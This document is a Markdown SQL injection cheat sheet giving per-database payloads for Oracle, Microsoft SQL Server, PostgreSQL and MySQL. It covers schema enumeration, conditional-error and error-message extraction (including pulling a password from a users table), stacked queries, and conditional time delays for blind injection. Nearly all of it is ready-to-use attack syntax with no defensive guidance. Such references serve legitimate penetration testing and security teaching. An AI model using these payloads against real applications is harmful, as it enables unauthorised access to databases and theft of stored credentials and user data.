# SQL injection cheat sheet
# String concatenation

* **Oracle** 
    * `'foo'||'bar'`
* **Microsoft** 
    * `'foo'+'bar'`
* **PostgreSQL** 	
    * `'foo'||'bar'`
* **MySQL** 
    * `'foo' 'bar'` [Note the space between the two strings]
    * `CONCAT('foo','bar')`

# Substring

* **Oracle** 
    * `SUBSTR('foobar', 4, 2)`
* **Microsoft** 
    * `SUBSTRING('foobar', 4, 2)`
* **PostgreSQL** 	
    * `SUBSTRING('foobar', 4, 2)`
* **MySQL** 
    * `SUBSTRING('foobar', 4, 2)`

# Comments

* **Oracle** 
    * `--comment`
* **Microsoft** 
    * `--comment`
    * `/*comment*/`
* **PostgreSQL** 	
    * `--comment`
    * `/*comment*/`
* **MySQL** 
    * `#comment`
    * `-- comment` [Note the space after the double dash]
    * `/*comment*/`

# Database version

* **Oracle** 
    * `SELECT banner FROM v$version`
    * `SELECT version FROM v$instance`
* **Microsoft** 
    * `SELECT @@version`
* **PostgreSQL** 	
    * `SELECT version()`
* **MySQL** 
    * `SELECT @@version`

# Database contents

* **Oracle** 
    * `SELECT * FROM all_tables`
    * `SELECT * FROM all_tab_columns WHERE table_name = 'TABLE-NAME-HERE'`
* **Microsoft** 
    * `SELECT * FROM information_schema.tables`
    * `SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'`
* **PostgreSQL** 	
    * `SELECT * FROM information_schema.tables`
    * `SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'`
* **MySQL** 
    * `SELECT * FROM information_schema.tables`
    * `SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'`

# Conditional errors

* **Oracle** 
    * `SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN TO_CHAR(1/0) ELSE NULL END FROM dual`
* **Microsoft** 
    * `SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/0 ELSE NULL END`
* **PostgreSQL** 	
    * `1 = (SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/(SELECT 0) ELSE NULL END)`
* **MySQL** 
    * `SELECT IF(YOUR-CONDITION-HERE,(SELECT table_name FROM information_schema.tables),'a')`

# Extracting data via visible error messages

* **Microsoft** 
    * `SELECT 'foo' WHERE 1 = (SELECT 'secret')`
    > Conversion failed when converting the varchar value 'secret' to data type int.
* **PostgreSQL** 	
    * `SELECT CAST((SELECT password FROM users LIMIT 1) AS int)`
    > invalid input syntax for integer: "secret"
* **MySQL** 
    * `SELECT 'foo' WHERE 1=1 AND EXTRACTVALUE(1, CONCAT(0x5c, (SELECT 'secret')))`
    > XPATH syntax error: '\secret'

# Batched (or stacked) queries

* **Oracle** 
    * `Does not support batched queries.`
* **Microsoft** 
    * `QUERY-1-HERE; QUERY-2-HERE`
* **PostgreSQL** 	
    * `QUERY-1-HERE; QUERY-2-HERE`
* **MySQL** 
    * `QUERY-1-HERE; QUERY-2-HERE`

# Time delays

* **Oracle** 
    * `dbms_pipe.receive_message(('a'),10)`
* **Microsoft** 
    * `WAITFOR DELAY '0:0:10'`
* **PostgreSQL** 	
    * `SELECT pg_sleep(10)`
* **MySQL** 
    * `SELECT SLEEP(10)`

# Conditional time delays

* **Oracle** 
    * `SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 'a'||dbms_pipe.receive_message(('a'),10) ELSE NULL END FROM dual`
* **Microsoft** 
    * `IF (YOUR-CONDITION-HERE) WAITFOR DELAY '0:0:10'`
* **PostgreSQL** 	
    * `SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN pg_sleep(10) ELSE pg_sleep(0) END`
* **MySQL** 
    * `SELECT IF(YOUR-CONDITION-HERE,SLEEP(10),'a')`
